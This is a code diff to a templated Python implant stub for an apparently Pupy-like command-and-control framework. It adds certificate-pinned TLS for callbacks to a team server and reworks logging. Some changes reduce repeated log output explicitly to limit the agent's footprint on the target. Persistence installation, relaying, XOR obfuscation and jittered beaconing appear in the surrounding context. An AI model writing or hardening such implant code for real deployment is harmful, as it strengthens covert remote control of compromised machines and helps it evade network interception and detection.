@@ -102,6 +102,14 @@ class StubConfig:
     http_uri: str = "/index.html"      # fronting URI
     http_method: str = "POST"
 
+    # Callbacks over TLS, trusted by pinning the listener's own certificate
+    # rather than by whatever CAs the target happens to trust: a team server is
+    # usually reached by IP with a self-signed certificate, and "verify against
+    # the system store" would reject it while "verify nothing" would be a
+    # man-in-the-middle with extra steps.
+    tls: bool = False
+    tls_cert_pem: str = ""
+
     # Relay
     relay_pipe: str = "pupypeer"       # pipe name (win) / unix-socket name (posix)
     relay_bind: str = "0.0.0.0"
@@ -362,11 +370,17 @@ def _xor(key: bytes, data: bytes) -> bytes:
 def _sha256(b):
     return _hl.sha256(_enc(b)).hexdigest()
 
+_LOG_LEVELS = {"debug": _lg.DEBUG, "info": _lg.INFO,
+               "warning": _lg.WARNING, "error": _lg.ERROR}
+
 def _log(msg, level="info"):
     if level == "debug" and not dbg:
         return
     try:
-        _lg.info("[pupyteer] %s", msg)
+        # Honour the level: with no handler configured, logging only emits
+        # WARNING and above, so an "error" sent through info() is dropped and a
+        # failed build or bind is invisible on the target.
+        _lg.log(_LOG_LEVELS.get(level, _lg.INFO), "[pupyteer] %s", msg)
     except Exception:
         pass
 
@@ -608,6 +622,24 @@ def identity():
 class TransportError(Exception):
     pass
 
+TLS_ON = {{ cfg.tls }}
+TLS_CERT_PEM = {{ cfg.tls_cert_pem | tojson }}
+
+def pinned_tls_context():
+    """A client context that trusts exactly one certificate: the listener's.
+
+    Hostname checking is off because the team server is normally addressed by
+    IP, and its self-signed certificate has no matching name. Signature
+    verification stays on, so anything but the pinned certificate is rejected.
+    """
+    if not TLS_CERT_PEM:
+        raise TransportError("TLS is enabled but no listener certificate was compiled in")
+    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_REQUIRED
+    ctx.load_verify_locations(cadata=TLS_CERT_PEM)
+    return ctx
+
 class BaseTransport:
     name = "base"
 
@@ -644,6 +676,9 @@ class TCPTransport(BaseTransport):
             s = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
             s.settimeout(self._timeout)
             s.connect((self._host, self._port))
+            if TLS_ON:
+                s = pinned_tls_context().wrap_socket(
+                    s, server_hostname=self._host)
             self._sock = s
         return self._sock
 
@@ -680,7 +715,10 @@ class HTTPTransport(BaseTransport):
                  uri: str = "{{ cfg.http_uri }}",
                  ua: str = "{{ cfg.user_agent }}",
                  method: str = "{{ cfg.http_method }}"):
-        self._base = f"http{'s' if tls else ''}://{host}:{port}"
+        self._host = host
+        self._port = port
+        self._tls = tls or TLS_ON
+        self._base = f"http{'s' if self._tls else ''}://{host}:{port}"
         self._uri = uri
         self._ua = ua
         self._method = method
@@ -700,7 +738,8 @@ class HTTPTransport(BaseTransport):
                 headers=headers,
                 method=self._method,
             )
-            with urllib.request.urlopen(req, timeout=15) as resp:
+            context = pinned_tls_context() if self._tls else None
+            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                 raw = resp.read()
                 try:
                     return _b64d(raw)
@@ -1590,6 +1629,12 @@ def _parse_command(text: str) -> dict:
 
 def main():
     _log(f"starting agent {AGENT_ID} on {PLATFORM}/{ARCH}")
+    if TLS_ON and not TLS_CERT_PEM:
+        # Not a transient failure to wait out: without a certificate to trust the
+        # agent can never reach its listener, and a silent retry loop hides the
+        # build mistake that caused it.
+        _log("TLS enabled with no listener certificate compiled in; exiting", "error")
+        raise SystemExit(2)
     {% if persistence %}
     try:
         install_persistence()
@@ -1602,12 +1647,17 @@ def main():
     except Exception as e:
         _log(f"relay error: {e}", "debug")
     {% endif %}
+    failures = 0
     while True:
         transport = make_transport()
         try:
             _c2_roundtrip(transport)
+            failures = 0
         except Exception as e:
-            _log(f"link lost: {e}", "debug")
+            failures += 1
+            # The first failure is the one that answers "why is this beacon not
+            # coming home". After that keep quiet: repeating it is a footprint.
+            _log(f"link lost: {e}", "info" if failures == 1 else "debug")
             transport.close()
             _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})
 
